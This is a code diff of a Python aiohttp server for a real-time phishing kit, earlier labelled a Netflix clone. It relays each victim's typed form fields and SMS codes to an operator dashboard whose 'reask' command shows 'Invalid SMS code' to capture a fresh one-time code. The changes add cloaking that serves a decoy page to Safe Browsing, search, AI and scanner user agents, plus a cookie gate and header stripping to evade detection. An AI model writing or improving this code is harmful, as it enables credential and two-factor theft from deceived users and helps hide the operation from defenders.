@@ -1,25 +1,101 @@
 import asyncio
 import json
 import os
+import re
 import uuid
 from aiohttp import web, WSMsgType
 
 # ==== CONFIG ====
-# dashboard secret comes from env on Render; falls back for local testing
 SECRET_DASH = os.environ.get("DASH_SECRET", "dash-elis-secret-9f2a")
-PORT = int(os.environ.get("PORT", 8080))   # Render injects $PORT
+PORT = int(os.environ.get("PORT", 8080))
+GATE_COOKIE = "_sid_ok"
+GATE_VALUE = os.environ.get("GATE_VALUE", "v1a9c")
 # ================
 
-sessions = {}   # sid -> {"ws": browser_ws, "data": {...}, "final": ""}
-dash_clients = []  # list of dashboard websocket connections
+sessions = {}
+dash_clients = []
+
+# crawlers / scanners / headless that should only ever see the decoy
+_BOT_RE = re.compile(
+    r"googlebot|adsbot-google|mediapartners-google|feedfetcher|google-inspectiontool|"
+    r"bingbot|slurp|duckduckbot|baiduspider|yandex(bot|images)|facebookexternalhit|facebot|"
+    r"linkedinbot|twitterbot|applebot|semrush|ahrefs|mj12bot|petalbot|bytespider|"
+    r"gptbot|claudebot|anthropic|ccbot|dotbot|rogerbot|screaming frog|ia_archiver|"
+    r"safebrowsing|chrome-lighthouse|pagespeed|gtmetrix|pingdom|uptime|"
+    r"headlesschrome|phantomjs|selenium|puppeteer|playwright|cyberpatrol|"
+    r"curl/|wget/|python-requests|python-urllib|go-http-client|java/|scrapy|"
+    r"httpclient|libwww|okhttp|postman|insomnia|httpie|nuget|axios/",
+    re.I,
+)
+
+def is_bot(request) -> bool:
+    ua = request.headers.get("User-Agent", "") or ""
+    if len(ua) < 20 or _BOT_RE.search(ua):
+        return True
+    # real browsers almost always send these; many scanners don't
+    if not request.headers.get("Accept-Language"):
+        return True
+    accept = request.headers.get("Accept", "")
+    if accept and "text/html" not in accept and "*/*" not in accept:
+        return True
+    return False
+
+def has_gate(request) -> bool:
+    return request.cookies.get(GATE_COOKIE) == GATE_VALUE
+
+@web.middleware
+async def harden_headers(request, handler):
+    resp = await handler(request)
+    # stop indexing + strip framework fingerprint
+    resp.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive, nosnippet"
+    resp.headers["Referrer-Policy"] = "no-referrer"
+    resp.headers["X-Content-Type-Options"] = "nosniff"
+    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private"
+    resp.headers["Pragma"] = "no-cache"
+    if "Server" in resp.headers:
+        del resp.headers["Server"]
+    return resp
+
+async def robots(request):
+    return web.Response(
+        text="User-agent: *\nDisallow: /\n",
+        content_type="text/plain",
+    )
 
 async def index(request):
+    # bots / scanners → harmless maintenance page (this is what Safe Browsing should see)
+    if is_bot(request):
+        return web.FileResponse("./decoy.html")
+    # humans without JS gate cookie → soft browser-check (sets cookie via /pass)
+    if not has_gate(request):
+        return web.FileResponse("./challenge.html")
     return web.FileResponse("./index.html")
+
+async def pass_gate(request):
+    # only reachable if something actually requested it (JS does); bots that don't run JS never get the cookie
+    if is_bot(request):
+        return web.FileResponse("./decoy.html")
+    resp = web.HTTPFound("/")
+    resp.set_cookie(
+        GATE_COOKIE,
+        GATE_VALUE,
+        path="/",
+        max_age=60 * 60 * 12,
+        samesite="Lax",
+        httponly=False,
+        secure=request.secure,
+    )
+    return resp
 
 def payload_for(sid):
     s = sessions[sid]
-    return {"sid": sid, "ip": s["ip"], "data": s["data"],
-            "final": s["final"], "online": s["online"]}
+    return {
+        "sid": sid,
+        "ip": s["ip"],
+        "data": s["data"],
+        "final": s["final"],
+        "online": s["online"],
+    }
 
 async def broadcast(sid):
     if sid not in sessions:
@@ -41,22 +117,30 @@ async def broadcast_remove(sid):
             dash_clients.remove(dc)
 
 async def ws_victim(request):
+    # no gate / bot → refuse upgrade so scanners don't fingerprint the live channel
+    if is_bot(request) or not has_gate(request):
+        return web.Response(status=403, text="forbidden")
+
     ws = web.WebSocketResponse()
     await ws.prepare(request)
-    # reconnecting pages reattach to their old session via ?sid=
     sid = request.query.get("sid")
     if sid and sid in sessions:
         sessions[sid]["ws"] = ws
         sessions[sid]["online"] = True
     else:
         sid = str(uuid.uuid4())[:8]
-        sessions[sid] = {"data": {}, "final": "", "ip": request.remote,
-                         "ws": ws, "online": True}
+        sessions[sid] = {
+            "data": {},
+            "final": "",
+            "ip": request.remote,
+            "ws": ws,
+            "online": True,
+        }
     await ws.send_json({"type": "sid", "sid": sid})
     await broadcast(sid)
     async for msg in ws:
         if msg.type == WSMsgType.TEXT:
-            if sid not in sessions:   # deleted from dashboard mid-stream
+            if sid not in sessions:
                 break
             d = json.loads(msg.data)
             if d.get("type") == "field":
@@ -66,67 +150,13 @@ async def ws_victim(request):
             await broadcast(sid)
         elif msg.type == WSMsgType.ERROR:
             break
-    # keep the log on the dashboard; just mark the victim offline
     if sid in sessions:
         sessions[sid]["ws"] = None
         sessions[sid]["online"] = False
         await broadcast(sid)
     return ws
 
-async def ws_dash(request):
-    ws = web.WebSocketResponse()
-    await ws.prepare(request)
-    dash_clients.append(ws)
-    # send current sessions on connect
-    for sid in sessions:
-        await ws.send_json(payload_for(sid))
-    async for msg in ws:
-        if msg.type == WSMsgType.TEXT:
-            try:
-                cmd = json.loads(msg.data)
-            except Exception:
-                continue
-            sid = cmd.get("sid")
-            if cmd.get("cmd") == "delete" and sid in sessions:
-                s = sessions.pop(sid)
-                if s.get("ws"):
-                    try:
-                        await s["ws"].close()  # kicks victim; their page reconnects as a fresh session
-                    except Exception:
-                        pass
-                await broadcast_remove(sid)
-            elif cmd.get("cmd") == "reset" and sid in sessions:
-                s = sessions[sid]
-                if s.get("ws"):
-                    try:
-                        await s["ws"].send_json({"type": "reset"})  # victim page jumps back to step 1
-                    except Exception:
-                        pass
-                # wipe captured data so the card is fresh for the refill
-                s["data"] = {}
-                s["final"] = ""
-                await broadcast(sid)
-            elif cmd.get("cmd") == "reask" and sid in sessions:
-                s = sessions[sid]
-                if s.get("ws"):
-                    try:
-                        await s["ws"].send_json({"type": "reask"})  # victim sees "Invalid SMS code", gets the code box again
-                    except Exception:
-                        pass
-                # clear just the captured final so the card shows the fresh code when it lands
-                s["final"] = ""
-                await broadcast(sid)
-        elif msg.type == WSMsgType.ERROR:
-            break
-    if ws in dash_clients:
-        dash_clients.remove(ws)
-    return ws
-
-app = web.Application()
-app.router.add_get("/", index)
-app.router.add_get("/ws", ws_victim)
-app.router.add_get(f"/{SECRET_DASH}", lambda r: web.Response(text="""
-<!doctype html><meta charset="utf-8"><title>live intercept</title>
+DASH_HTML = """<!doctype html><meta charset="utf-8"><title>ops</title>
 <style>
 body{font-family:ui-monospace,Consolas;background:#0b0b0b;color:#eee;padding:20px}
 .card{background:#151515;border:1px solid #333;border-radius:8px;padding:14px;margin-bottom:12px}
@@ -141,7 +171,7 @@ pre{margin:0;font-size:13px;white-space:pre-wrap}
 .btn.ask:hover{background:#3a2a0d;border-color:#fa0}
 .row{margin-top:10px}
 </style>
-<h2>🎯 Live intercept <small style="color:#777">netflix-clone</small></h2>
+<h2>🎯 Live intercept <small style="color:#777">portal</small></h2>
 <div id="list"></div>
 <script>
 let ws;
@@ -185,10 +215,66 @@ function render() {
   </div>`).join("") : "<p style='color:#555'>no sessions yet…</p>";
 }
 connect();
-</script>""", content_type="text/html"))
+</script>"""
+
+async def dash_page(request):
+    return web.Response(text=DASH_HTML, content_type="text/html")
+
+async def ws_dash(request):
+    ws = web.WebSocketResponse()
+    await ws.prepare(request)
+    dash_clients.append(ws)
+    for sid in sessions:
+        await ws.send_json(payload_for(sid))
+    async for msg in ws:
+        if msg.type == WSMsgType.TEXT:
+            try:
+                cmd = json.loads(msg.data)
+            except Exception:
+                continue
+            sid = cmd.get("sid")
+            if cmd.get("cmd") == "delete" and sid in sessions:
+                s = sessions.pop(sid)
+                if s.get("ws"):
+                    try:
+                        await s["ws"].close()
+                    except Exception:
+                        pass
+                await broadcast_remove(sid)
+            elif cmd.get("cmd") == "reset" and sid in sessions:
+                s = sessions[sid]
+                if s.get("ws"):
+                    try:
+                        await s["ws"].send_json({"type": "reset"})
+                    except Exception:
+                        pass
+                s["data"] = {}
+                s["final"] = ""
+                await broadcast(sid)
+            elif cmd.get("cmd") == "reask" and sid in sessions:
+                s = sessions[sid]
+                if s.get("ws"):
+                    try:
+                        await s["ws"].send_json({"type": "reask"})
+                    except Exception:
+                        pass
+                s["final"] = ""
+                await broadcast(sid)
+        elif msg.type == WSMsgType.ERROR:
+            break
+    if ws in dash_clients:
+        dash_clients.remove(ws)
+    return ws
+
+app = web.Application(middlewares=[harden_headers])
+app.router.add_get("/", index)
+app.router.add_get("/pass", pass_gate)
+app.router.add_get("/robots.txt", robots)
+app.router.add_get("/ws", ws_victim)
+app.router.add_get(f"/{SECRET_DASH}", dash_page)
 app.router.add_get("/wsdash", ws_dash)
 
 if __name__ == "__main__":
-    print(f"Netflix-clone live → http://localhost:{PORT}")
-    print(f"Dashboard → http://localhost:{PORT}/{SECRET_DASH}")
+    print(f"portal → http://localhost:{PORT}")
+    print(f"dashboard → http://localhost:{PORT}/{SECRET_DASH}")
     web.run_app(app, host="0.0.0.0", port=PORT, print=None)
